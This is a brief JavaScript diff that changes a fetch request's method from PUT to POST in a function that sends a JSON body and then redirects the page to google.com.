@@ -20,7 +20,7 @@ async function a(a){
       'Accept': 'application/json',
       'Content-Type': "application/json",
      },
-     method: "PUT",
+     method: "POST",
      body: json
     })
     window.location.replace("https://google.com")
